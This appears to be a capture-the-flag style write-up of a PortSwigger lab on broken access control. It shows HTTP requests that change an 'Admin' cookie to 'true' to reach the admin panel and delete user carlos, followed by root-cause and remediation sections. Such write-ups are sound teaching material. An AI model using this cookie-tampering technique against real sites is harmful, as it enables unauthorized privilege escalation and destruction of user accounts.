Below is a more detailed, portfolio-style lab write-up that documents the full testing process and each significant request. Since this is for your learning repository, it emphasizes the methodology and observations rather than just the final result.

# Lab 03 - User Role Controlled by Request Parameter

## Overview

This lab demonstrates a **Broken Access Control** vulnerability where the application determines whether a user is an administrator by trusting a client-controlled cookie. Because cookies are stored in the user's browser, they can be modified by an attacker.

The objective is to gain unauthorized access to the administrator panel and delete the user **carlos**.

---

# Objective

* Identify how the application determines administrator privileges.
* Verify whether the authorization mechanism can be manipulated.
* Access the administrator panel.
* Delete the user **carlos**.
* Understand why this vulnerability exists and how it should be prevented.

---

# Reconnaissance

## Step 1 - Login

Logged in using the provided credentials.

**Username**

```text
wiener
```

**Password**

```text
peter
```

After authentication, Burp Suite captured the authenticated request.

---

## Step 2 - Inspect the Request

The request to the account page was:

```http
GET /my-account?id=wiener HTTP/2
Host: <lab-id>.web-security-academy.net

Cookie: Admin=false; session=AVGOaRblqxTET2JLPwmuNaVpm8ds2lCi
```

### Observation

Two cookies were present.

| Cookie  | Purpose                                        |
| ------- | ---------------------------------------------- |
| session | Authenticated session identifier               |
| Admin   | Indicates whether the user is an administrator |

The **Admin** cookie immediately appeared suspicious because authorization information was being supplied by the client.

---

# Vulnerability Analysis

## Initial Hypothesis

If the application trusts the value of the **Admin** cookie, changing it from:

```text
false
```

to

```text
true
```

may grant administrator privileges.

Instead of changing multiple values, only one parameter would be modified to isolate the effect.

---

# Exploitation

## Experiment 1 - Modify the Cookie

The original cookie:

```http
Cookie: Admin=false; session=AVGOaRblqxTET2JLPwmuNaVpm8ds2lCi
```

was modified to:

```http
Cookie: Admin=true; session=AVGOaRblqxTET2JLPwmuNaVpm8ds2lCi
```

The request remained identical except for the value of the **Admin** cookie.

Request:

```http
GET /my-account?id=wiener HTTP/2
Host: <lab-id>.web-security-academy.net

Cookie: Admin=true; session=AVGOaRblqxTET2JLPwmuNaVpm8ds2lCi
```

### Result

The response changed.

A new navigation link appeared:

```html
<a href="/admin">Admin panel</a>
```

### Conclusion

The server was trusting the client-controlled cookie for authorization.

This confirmed a privilege escalation vulnerability.

---

## Experiment 2 - Access the Administrator Panel

The next request was sent while keeping the modified cookie.

Request

```http
GET /admin HTTP/2
Host: <lab-id>.web-security-academy.net

Cookie: Admin=true; session=AVGOaRblqxTET2JLPwmuNaVpm8ds2lCi
```

### Result

The server returned:

```http
HTTP/2 200 OK
```

The administrator interface became accessible.

The response listed all users.

Example:

```text
wiener
carlos
```

Each user had a delete function.

Example:

```html
<a href="/admin/delete?username=carlos">Delete</a>
```

---

## Experiment 3 - Delete Carlos

The delete endpoint discovered in the administrator panel was requested.

Request

```http
GET /admin/delete?username=carlos HTTP/2
Host: <lab-id>.web-security-academy.net

Cookie: Admin=true; session=AVGOaRblqxTET2JLPwmuNaVpm8ds2lCi
```

### Response

```http
HTTP/2 302 Found
Location: /admin
```

### Analysis

The **302 Found** response indicates that the delete operation completed successfully and the application redirected back to the administrator panel.

---

## Experiment 4 - Verify the Deletion

The administrator panel was requested again.

```http
GET /admin HTTP/2
Host: <lab-id>.web-security-academy.net

Cookie: Admin=true; session=AVGOaRblqxTET2JLPwmuNaVpm8ds2lCi
```

### Result

The user **carlos** no longer appeared in the user list.

The PortSwigger Academy marked the lab as **Solved**.

---

# Root Cause

The application made authorization decisions using a client-controlled cookie.

Since users completely control cookies stored in their browser, they can modify values before sending requests to the server.

Instead of validating administrator privileges using trusted server-side session data, the application relied on:

```http
Admin=true
```

This allowed any authenticated user to become an administrator simply by editing a cookie.

---

# Security Impact

If this vulnerability existed in a production environment, an attacker could:

* Escalate privileges to administrator.
* Access administrative functionality.
* Delete or modify user accounts.
* View restricted information.
* Execute privileged operations.
* Completely bypass authorization controls.

---

# Remediation

* Never store authorization decisions in client-controlled cookies.
* Store only an unpredictable session identifier in cookies.
* Associate user roles with the server-side session.
* Validate permissions on every privileged request.
* Apply the principle of least privilege.
* Perform authorization checks on the server regardless of any client-supplied values.

---

# Key Takeaways

* Authentication identifies who a user is.
* Authorization determines what a user is allowed to do.
* Client-controlled data must never determine access rights.
* Always change one parameter at a time when testing.
* Burp Repeater is ideal for validating authorization hypotheses through controlled request modification.
* Every privileged endpoint should enforce server-side authorization, even if the user interface attempts to hide administrative functionality.
